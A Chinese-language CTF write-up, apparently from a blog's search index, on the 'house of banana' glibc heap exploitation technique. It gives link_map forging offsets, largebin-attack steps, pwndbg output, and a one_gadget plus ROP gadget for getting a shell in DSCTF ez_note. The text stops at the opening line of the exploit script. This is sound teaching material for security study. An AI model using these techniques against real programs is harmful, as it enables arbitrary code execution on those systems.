<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于house of banana的一次利用</title>
      <link href="/posts/2564.html"/>
      <url>/posts/2564.html</url>
      
        <content type="html"><![CDATA[<h1 id="关于house-of-banana的一次利用"><a href="#关于house-of-banana的一次利用" class="headerlink" title="关于house of banana的一次利用"></a>关于house of banana的一次利用</h1><h2 id="劫持的原理"><a href="#劫持的原理" class="headerlink" title="劫持的原理"></a>劫持的原理</h2><p>首先介绍一下house of banana的使用条件，使用house of banana一般是需要调用exit函数的，因为在调用链中<code>exit--&gt;__run_exit_handlers--&gt;_dl_fini--&gt;((fini_t) array[i]) ()</code>,在dl_fini中调用<code>((fini_t) array[i]) ()</code>的过程中，会根据源码中<code>array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\]-&gt;d_un.d_ptr);</code>而来，而<code>l</code>又来自于<code>struct link_map *l = maps[i];</code></p><p>在这里贴上一些大佬的分析过程：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    if (l-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL)&#123;    ElfW(Addr) *array &#x3D;    (ElfW(Addr) *) (l-&gt;l_addr            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);    unsigned int i &#x3D; (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val            &#x2F; sizeof (ElfW(Addr)));    while (i-- &gt; 0)    ((fini_t) array[i]) ();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见在调用<code>((fini_t) array[i]) ();</code>之前，我们若是想要控制其调用，就需要控制<code>maps[i]</code>中的值，而<code>maps[i]</code>赋值过程来自于下面源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">define GL(name) _rtld_global._##namefor (l &#x3D; GL(dl_ns)[ns]._ns_loaded, i &#x3D; 0; l !&#x3D; NULL; l &#x3D; l-&gt;l_next)&#x2F;* Do not handle ld.so in secondary namespaces.  *&#x2F;if (l &#x3D;&#x3D; l-&gt;l_real)    &#123;assert (i &lt; nloaded);maps[i] &#x3D; l;l-&gt;l_idx &#x3D; i;++i;&#x2F;* Bump l_direct_opencount of all objects so that they    are not dlclose()ed from underneath us.  *&#x2F;++l-&gt;l_direct_opencount;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中我们不难看出，<code>maps[i]</code>的值来源于<code>l</code>，而<code>l</code>来源于<code>GL(dl_ns)[ns]._ns_loaded</code>并且还是一个循环赋值的过程，因此<code>l</code>的值还来源于<code>l-&gt;l_next</code>，可见<code>GL(dl_ns)[ns]._ns_loaded</code>是一个循环链表的头部，其中的节点都可以控制不同位置上的<code>maps[i]</code>值。</p><p>下面是大佬给出的分析：</p><p><code>maps</code>的元素是从<code>l</code>来，通过那个宏，说明<code>l</code>是从全局变量<code>_rtld_global._dl_ns[0]._ns_loaded</code>而来</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">pwndbg&gt; p _rtld_global._dl_ns[0]$2 &#x3D; &#123;  _ns_loaded &#x3D; 0x7ffff7ffe168,   _ns_nloaded &#x3D; 4,   _ns_main_searchlist &#x3D; 0x7ffff7ffe420,   _ns_global_scope_alloc &#x3D; 0,   _ns_unique_sym_table &#x3D; &#123;    lock &#x3D; &#123;      mutex &#x3D; &#123;        __data &#x3D; &#123;          __lock &#x3D; 0,           __count &#x3D; 0,           __owner &#x3D; 0,           __nusers &#x3D; 0,           __kind &#x3D; 1,           __spins &#x3D; 0,           __elision &#x3D; 0,           __list &#x3D; &#123;            __prev &#x3D; 0x0,             __next &#x3D; 0x0          &#125;        &#125;,         __size &#x3D; &#39;\000&#39; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#39;\000&#39; &lt;repeats 22 times&gt;,         __align &#x3D; 0      &#125;    &#125;,     entries &#x3D; 0x0,     size &#x3D; 0,     n_elements &#x3D; 0,     free &#x3D; 0x0  &#125;,   _ns_debug &#x3D; &#123;    r_version &#x3D; 0,     r_map &#x3D; 0x0,     r_brk &#x3D; 0,     r_state &#x3D; RT_CONSISTENT,     r_ldbase &#x3D; 0  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由for循环的<code>l = l-&gt;l_next</code>，说明其是个链表，只要把这个链表的指针覆盖，就可控制maps的元素，继而控制执行fini_array的执行。</p><h2 id="劫持过程"><a href="#劫持过程" class="headerlink" title="劫持过程"></a>劫持过程</h2><p>首先劫持大致上分为两种不同的情况，一种是对于链表头部的劫持，及对于<code>_ns_loaded</code>的劫持，还有一种是对于链表末尾，及第四个节点的劫持，及对于<code>_ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next</code>的劫持。由于在链表的头部设置了链表的大小，及<code>_ns_nloaded = 4, 这里知名个这个链表的节点个数，在exit后面加载的检查中，会要求_ns_nloaded链表的节点不少于3个</code>，因此如果劫持头部的话，剩下的三个节点仍然需要伪造，如果仅仅劫持最后的一个节点，那么<code>l_next</code>设置为0即可。</p><h3 id="对于-ns-loaded的劫持条件："><a href="#对于-ns-loaded的劫持条件：" class="headerlink" title="对于_ns_loaded的劫持条件："></a>对于<code>_ns_loaded</code>的劫持条件：</h3><p>这里直接粘贴其他师傅分析给出的条件：</p><ul><li>这两个条件即可以看出，for要循环四次，maps[i]需要赋四个值。</li></ul><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert (ns !&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded);assert (ns &#x3D;&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded || i &#x3D;&#x3D; nloaded - 1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p><code>l-&gt;l_init_called</code>需要等于1,只占一位</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">enum&#x2F;* Where this object came from.  *&#x2F;&#123;lt_executable,&#x2F;* The main executable program.  *&#x2F;lt_library,&#x2F;* Library needed by main executable.  *&#x2F;lt_loaded&#x2F;* Extra run-time loaded shared object.  *&#x2F;&#125; l_type:2;unsigned int l_relocated:1;&#x2F;* Nonzero if object&#39;s relocations done.  *&#x2F;unsigned int l_init_called:1; &#x2F;* Nonzero if DT_INIT function called.  *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>l-&gt;l_info[DT_FINI_ARRAY] != NULL|| l-&gt;l_info[DT_FINI] != NULL</code></p></li><li><p><code>l-&gt;l_addr</code>需要是目标函数的地址且<code>l-&gt;l_info[26]-&gt;d_un.d_ptr</code> 为0，<code>l-&gt;l_info[28]-&gt;d_un.d_val</code>为8</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ElfW(Addr) *array &#x3D;    (ElfW(Addr) *) (l-&gt;l_addr    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);  unsigned int i &#x3D; (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val    &#x2F; sizeof (ElfW(Addr)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="对于-rtld-global-dl-ns-ns-loaded-l-next-l-next-l-next的劫持条件："><a href="#对于-rtld-global-dl-ns-ns-loaded-l-next-l-next-l-next的劫持条件：" class="headerlink" title="对于_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next的劫持条件："></a>对于<code>_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</code>的劫持条件：</h3><p>因为劫持_ns_loaded需要绕过两次assert()，比较麻烦，因此我们可以直接劫持<code>_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</code>，将其修改为chunk的地址，破坏更小，绕过更简单。</p><p>和上面的方法大体一样</p><ul><li><p>我们需要将l_next置0</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert (nloaded !&#x3D; 0 || GL(dl_ns)[ns]._ns_loaded &#x3D;&#x3D; NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>为了能使maps[3]&#x3D;l，需要使l_real&#x3D;&#x3D;l</p></li><li><p><code>l-&gt;l_init_called</code>需要等于1,只占一位</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">enum&#x2F;* Where this object came from.  *&#x2F;&#123;lt_executable,&#x2F;* The main executable program.  *&#x2F;lt_library,&#x2F;* Library needed by main executable.  *&#x2F;lt_loaded&#x2F;* Extra run-time loaded shared object.  *&#x2F;&#125; l_type:2;unsigned int l_relocated:1;&#x2F;* Nonzero if object&#39;s relocations done.  *&#x2F;unsigned int l_init_called:1; &#x2F;* Nonzero if DT_INIT function called.  *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>l-&gt;l_info[DT_FINI_ARRAY] != NULL|| l-&gt;l_info[DT_FINI] != NULL</code></p></li><li><p><code>l-&gt;l_addr</code>需要是目标函数的地址且<code>l-&gt;l_info[26]-&gt;d_un.d_ptr</code> 为0，<code>l-&gt;l_info[28]-&gt;d_un.d_val</code>为8</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ElfW(Addr) *array &#x3D;    (ElfW(Addr) *) (l-&gt;l_addr    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);  unsigned int i &#x3D; (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val    &#x2F; sizeof (ElfW(Addr)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>但是我并没有使用这个师傅给出的劫持条件，首先的问题就是如果使用largebin_attack的话，那么最直接的问题就是<code>l-&gt;l_addr</code>处于攻击后chunk的头部分，有可能修改不到，还有就是我试了试这种的构造方法，好像并不太行，也不知道为什么……</p><h2 id="另一个师傅的劫持分析"><a href="#另一个师傅的劫持分析" class="headerlink" title="另一个师傅的劫持分析"></a>另一个师傅的劫持分析</h2><p>我的题目的主要构造来自于这个师傅的：<a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p><p>这位师傅采用的是对于<code>_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</code>的劫持方式，我后面的题目构造主要来在于这位师傅。</p><p>下面全部来自这位师傅的劫持分析：</p><h3 id="开始劫持"><a href="#开始劫持" class="headerlink" title="开始劫持"></a>开始劫持</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">for (l &#x3D; GL(dl_ns)[ns]._ns_loaded, i &#x3D; 0; l !&#x3D; NULL; l &#x3D; l-&gt;l_next)    &#x2F;* Do not handle ld.so in secondary namespaces.  *&#x2F;&#x2F;&#x2F; -------------------check0--------------------------------    if (l &#x3D;&#x3D; l-&gt;l_real)&#x2F;&#x2F; -------------------check0--------------------------------    &#123;    assert (i &lt; nloaded);    maps[i] &#x3D; l;    l-&gt;l_idx &#x3D; i;    ++i;    &#x2F;* Bump l_direct_opencount of all objects so that they        are not dlclose()ed from underneath us.  *&#x2F;    ++l-&gt;l_direct_opencount;    &#125;assert (ns !&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded);assert (ns &#x3D;&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded || i &#x3D;&#x3D; nloaded - 1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态调试时发现maps必须要有四个元素，所以我劫持的是第三个节点的next指针这样不会破环长度从而绕过下面的两个断言。</p><pre class="line-numbers language-POWERSHELL" data-language="POWERSHELL"><code class="language-POWERSHELL">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)0x7ffff7ffd040-&gt;0x7ffff7fdc018 is -0x21028 bytes (-0x4205 words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>劫持时只需在<code>_rtld_global-0x21028</code>处写入fake就行，这时可以参考large bin attack试试</p><p>另外为了能写入maps <code>maps[i] = l;</code>，需要绕过 check0，所以<code>fake+0x28</code>处要写入fake自己的地址</p><p>向下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#defineDT_FINI_ARRAY26&#x2F;* Array with addresses of fini fct *&#x2F;#defineDT_FINI_ARRAYSZ28&#x2F;* Size in bytes of DT_FINI_ARRAY *&#x2F;  for (i &#x3D; 0; i &lt; nmaps; ++i)&#123;    struct link_map *l &#x3D; maps[i];&#x2F;&#x2F; -------------------check1--------------------------------    if (l-&gt;l_init_called)&#x2F;&#x2F; -------------------check1--------------------------------&#123;  &#x2F;* Make sure nothing happens if we are called twice.  *&#x2F;  l-&gt;l_init_called &#x3D; 0;  &#x2F;* Is there a destructor function?  *&#x2F;&#x2F;&#x2F; -------------------check2--------------------------------  if (l-&gt;l_info[26] !&#x3D; NULL      || l-&gt;l_info[DT_FINI] !&#x3D; NULL)&#x2F;&#x2F; -------------------check2--------------------------------    &#123;                ....&#x2F;&#x2F; -------------------check3--------------------------------        if (l-&gt;l_info[26] !&#x3D; NULL)&#x2F;&#x2F; -------------------check3--------------------------------                &#123;                    array &#x3D; (l-&gt;l_addr + l-&gt;l_info[26]-&gt;d_un.d_ptr);                                        i &#x3D; (l-&gt;l_info[28]-&gt;d_un.d_val &#x2F; 8));                                        while (i-- &gt; 0)                        ((fini_t) array[i]) ();                &#125;                ...    &#125;        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于check1，是个枚举体中成员 l_init_called，由于各版本有所差异，所以还是现查现用</p><pre class="line-numbers language-POWERSHELL" data-language="POWERSHELL"><code class="language-POWERSHELL">pwndbg&gt; distance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called 0x7ffff7ffd040-&gt;0x7ffff7ffe47c is 0x314 bytes (0x287 words)pwndbg&gt; x&#x2F;wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called 0x7ffff7ffe47c:0x0000001c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以 fake+0x143 &#x3D; 0x1c ，便可绕过</p><p>对于check2，check3只需<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code> 便可绕过</p><pre class="line-numbers language-POWERSHELL" data-language="POWERSHELL"><code class="language-POWERSHELL">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26])0x7ffff7ffe168-&gt;0x7ffff7ffe278 is 0x110 bytes (0x22 words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在fake+0x110 写入的内容会直接控制array</p><pre class="line-numbers language-POWERSHELL" data-language="POWERSHELL"><code class="language-POWERSHELL">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28])0x7ffff7ffe168-&gt;0x7ffff7ffe288 is 0x120 bytes (0x24 words)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在fake+0x120写入的内容会控制<code>i</code></p><p>只要把<code>fake+0x120，fake+0x110</code> 控制好就可以控制最后的<code>((fini_t) array[i]) ();</code></p><p>这是正常执行fini_array的流程，所以我们照着此进行伪造。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">pwndbg&gt; p&#x2F;x  *((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26]) $16 &#x3D; &#123;  d_tag &#x3D; 0x1a,   d_un &#x3D; &#123;    d_val &#x3D; 0x600e18,     d_ptr &#x3D; 0x600e18  &#125;&#125;pwndbg&gt; p&#x2F;x  ((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26])-&gt;d_un.d_ptr$18 &#x3D; 0x600e18pwndbg&gt; telescope 0x600e1800:0000│   0x600e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x400840 (__do_global_dtors_aux) ◂— cmp    byte ptr [rip + 0x200849], 001:0008│   0x600e20 (__JCR_LIST__) ◂— 0x002:0010│   0x600e28 (_DYNAMIC) ◂— 0x1... ↓04:0020│   0x600e38 (_DYNAMIC+16) ◂— 0xc &#x2F;* &#39;\x0c&#39; *&#x2F;05:0028│   0x600e40 (_DYNAMIC+24) —▸ 0x400680 (_init) ◂— sub    rsp, 806:0030│   0x600e48 (_DYNAMIC+32) ◂— 0xd &#x2F;* &#39;\r&#39; *&#x2F;07:0038│   0x600e50 (_DYNAMIC+40) —▸ 0x400b14 (_fini) ◂— sub    rsp, 8pwndbg&gt; p&#x2F;x  *((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28]) $19 &#x3D; &#123;  d_tag &#x3D; 0x1c,   d_un &#x3D; &#123;    d_val &#x3D; 0x8,     d_ptr &#x3D; 0x8  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以</p><p>需要在<code>fake+0x110</code>写入一个ptr，且ptr+0x8处有ptr2，ptr2处写入的是最后要执行的函数地址.</p><p>需要在<code>fake+0x120</code>写入一个ptr，且ptr+0x8处是<code>i*8</code>。</p><p>我选择的是<code>fake+0x110</code>写入<code>fake+0x40</code>，在<code>fake+0x48</code>写入<code>fake+0x58</code>，在<code>fake+0x58</code>写入shell</p><p>我选择在<code>fake+0x120</code>写入<code>fake+0x48</code>，在<code>fake+0x50</code>处写入8。</p><p>综上所述</p><ul><li>劫持<ul><li><code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code></li></ul></li><li>check0<ul><li><code>fake+0x28 = fake</code></li></ul></li><li>check1<ul><li><code>fake+0x314 = 0x1c</code></li></ul></li><li>控制array<ul><li><code>fake+0x110 = fake+0x40</code></li><li><code>fake+0x48 = fake+0x58</code></li><li><code>fake+0x58 = shell</code></li></ul></li><li>控制i<ul><li><code>fake+0x120 = fake+0x48</code></li><li><code>fake+0x50 = 8</code></li></ul></li></ul><p>这位师傅是对于<code>_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</code>的劫持，如果我们需要使用对于<code>_ns_loaded</code>的劫持，那么我们就需要伪造<code>link_map</code>结构体的<code>l_next</code>值，我们可以让他继续指向原先的下一个结构体。简单来说就是<code>fake+0x10 = l_next</code>。</p><p>经过我的观察，我个人感觉这种劫持的方式好像不能够直接采用调用system(“&#x2F;bin&#x2F;sh”)的方式，因为在连表查询时，rdi的值总是上一个链表节点的地址，因此”&#x2F;bin&#x2F;sh”的地址不便于控制。</p><p>下面我通过DSCTF的ez_note来进行分析：</p><h2 id="DSCTF-ez-note"><a href="#DSCTF-ez-note" class="headerlink" title="DSCTF ez_note"></a>DSCTF ez_note</h2><p>先简单分析一下漏洞的地方：</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718001553.png"></p><p>我们可以看到，在一开始的初始化的过程中，先使用calloc函数分配了7个0x18大小的堆块用于后续存储和管理堆快信息。在gdb中调试我们发现是一个0xb0大小的堆块。</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718003050.png"></p><p>而漏洞就出现在了add函数的申请过程中：</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718003219.png"></p><p>从这里我们可以看出，因为边界的控制不当，我们最多可以申请8个堆块，这就造成了控制堆快上内容的溢出。并且由于管理堆块的结构问题，每个堆块被记录了三个内容，按顺序分别是：申请的size，堆块地址，写入内容的size。由于可以申请8个堆块，因此产生了控制堆块的溢出，而溢出的部分申请的第8个堆块，size正好可以控制到申请的第一个size的大小，这样我们就实现了堆块的重叠，也因此可以控制其他的堆块。</p><p>这道题目我们只能申请到size&gt;&#x3D;0x400大小的堆块，因此我们只能够使用largebin_attack。</p><h3 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin_attack"></a>Largebin_attack</h3><h4 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h4><p>首先我们申请两个大小不一致的堆块，并且要保证他们处于同一个largebin的size域内，一般情况下我建议是size头部为0x420大小的和0x430大小的堆块，并且中间需要用其他的堆块隔离开，防止合并。</p><p>在这道题目中，我申请完成后，堆块布局如下：</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718005327.png"></p><p>这个是一开始申请完7个堆块后的布局，之后我们利用漏洞，造成0x410堆块的size的修改，将其改为0x14f1，这时候第一个堆块的size变为了0x14f1，并且fd指针变为了刚刚申请出来的堆块的地址，因此我们直接show一下就可以泄露出堆块地址。之后我们通过释放掉修改后的堆块，并且再次申请大小为0x820的堆块，这样我们就能够将main_arena的地址放到第三个堆块的fd处，从而泄露libc地址。然后我们再将刚刚申请出来的堆块释放掉，这样我们的堆块合并后就还是原先的0x14f1大小的堆块。并且后面的5个堆块都被我给造成了堆块的重叠，这样我们就可以达到修改后面5个堆块内容的目的。</p><h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><p>我们使用largebin_attack攻击的过程大概是：</p><ol><li><p>首先释放掉两个堆块中较大的一个，使其进入到unstored_bin中。</p></li><li><p>申请一个比之前释放掉的堆块更大的一个堆块，使其进入到largebin中。（0x420大小的堆块进入0x400范围的largebin中）</p></li><li><p>释放掉两个堆快中较小的堆块，使其进入到unstored_bin中。</p></li><li><p>利用漏洞修改较大的堆块及现在处于largebin中堆块的bk_nextsize为target_addr-0x20。</p></li><li><p>申请一个比第二次释放掉的堆块大的堆块，使第二个堆块进入到largebin中，这个时候在连接的过程中，就可以向我们的目标地址写入一个堆地址，堆地址为较小对快的头部地址。</p></li><li><p>较大堆块进入unstored_bin中。</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718011224.png"></p></li><li><p>申请大堆块后，进入到largebin中。<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718011503.png"></p></li><li><p>释放掉较小堆块进入unstored_bin中。<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718011623.png"></p></li><li><p>修改较大堆块的bk_nextsize&#x3D;target_addr-0x20。</p><p>修改之前的chunk：<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718012340.png"></p><p>修改之后的chunk：<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718012410.png"></p></li><li><p>释放掉较小堆块，堆块头部地址写入目的地址。</p><p>修改前：<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718012533.png">修改后：<img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718012613.png"></p></li></ol><p>可见这时候Largebin_attack已经攻击成功了。</p><h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>我这里采用的是攻击<code>_ns_loaded</code>的方式，此时我们也已经将堆地址写入了<code>_rtld_global</code>,我们可以看到的是<code>_ns_loaded</code>指向的链表头部已经被我们替换为了我们的堆地址。</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718013213.jpg"></p><p>这个时候我们只需要按照上面的说明通过修改堆快的内容，来伪造好<code>link_map</code>结构体即可。</p><p>伪造好的结构体的部分显示：</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718013452.png"></p><p>我这里采用的是上面第二位师傅的方法，但是由于是头部攻击，我们需要布置一下内容：</p><ol><li><p><code>l_next</code>指向仍为之前的堆块的<code>l_next</code>。（<code>fake_file+0x20</code>）</p></li><li><p><code>l-&gt;l_info[26]-&gt;d_un.d_ptr</code>为一个ptr，在ptr+8处为ptr2，而ptr2处为shell地址。（<code>fake_file+0x110</code>）</p></li><li><p><code>l_real</code>指向自身的地址，在这里就是为堆块的头部。（<code>fake_file+0x40</code>）</p></li><li><p>控制<code>l-&gt;l_info[28]-&gt;d_un.d_val</code>的值为ptr，且ptr+0x8处是<code>i*8</code>，我们为了方便，一般控制为<code>8</code>。（在<code>fake+0x120</code>写入一个ptr，且ptr+0x8处是<code>i*8</code>。）</p></li><li><p>控制<code>l-&gt;l_init_called</code>需要等于1,只占一位。我们一般采用的方法就是直接的通过上面大佬给出的命令：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">pwndbg&gt; distance _rtld_global._dl_ns[0]._ns_loaded  &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called 0x7ffff7ffd040-&gt;0x7ffff7ffe47c is 0x314 bytes (0x287 words)pwndbg&gt; x&#x2F;wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called 0x7ffff7ffe47c:0x0000001c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在这种情况下就是<code>fake_file+0x314=0x0000001c</code>，而在高版本中，我这里测试出的是：<code>fake_file+0x31c=0x0000001c</code>。</p></li></ol><p>到这里我们的house of banana就算是可以执行我们任意地址的函数了，但是问题是我们这道题目想要拿到shell，无非就只能通过两种方法。一种是system(“&#x2F;bin&#x2F;sh”)，还有一种是走one_gadget。但是我发现system(“&#x2F;bin&#x2F;sh”)中rdi一直指向链表的前一个表头，我们不太容易使其指向”&#x2F;bin&#x2F;sh”。而one_gadget的话条件都不满足，因此我的方式是使用gadget来改变寄存器中的值从而使得one_gadget满足shell条件。</p><p><img src="/../pictures/house_of_banana/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220718020314.png"></p><p>这里我们发现在我们call我们的shell时，r15寄存器的值一直是比较稳定的<code>link_map</code>的头部，由于我们修改后，所以一般就是我们堆地址的头部，而堆地址上的内容可控，因此我们可以使用gadget来对寄存器中的值进行修改，使得寄存器中的值满足调用one_gadget条件后，再调用gadget。并且观察我们发现，此时r10&#x3D;0，而我们发现高版本中有一条gadget的情况我们基本满足：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0xebcf5 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, rdx)constraints:  address rbp-0x78 is writable  [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL  [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时我们只需要通过gadget将rdx赋值为0即可。我们使用下面这条命令在libc当中寻找：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">ROPgadget --binary libc.so.6 --only &#39;mov|call&#39; | grep &#39;r15&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们重点关注后面是call [r15+偏移]的gadget，我们发现了这样的一条gadget：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0x000000000008004a : mov rdx, r12 ; mov rsi, r14 ; mov rdi, rbx ; call qword ptr [r15 + 0x38]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（该偏移的版本为ubuntu 2.35-0ubuntu3_amd64）</p><p>此时r12刚好也为0，满足了我们的条件，因此我们将shell处写为这个gadget，然后在堆地址+0x38处即<code>fake_file+0x38</code>处写入我们的one_gadget地址，这样我们就能够拿到shell。</p><p>最后要说的是因为是远端打的话我们不知道ld和libc的偏移，因此可能涉及到要爆破一个字节256中情况，但是这道题我的ld和libc的偏移和远端的一致，就直接通了。(可能远端的也patchelf过的原因……)</p><p>最后的exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;DSCTF&#x2F;eznoted2b1405e&#x2F;eznote&quot;)# 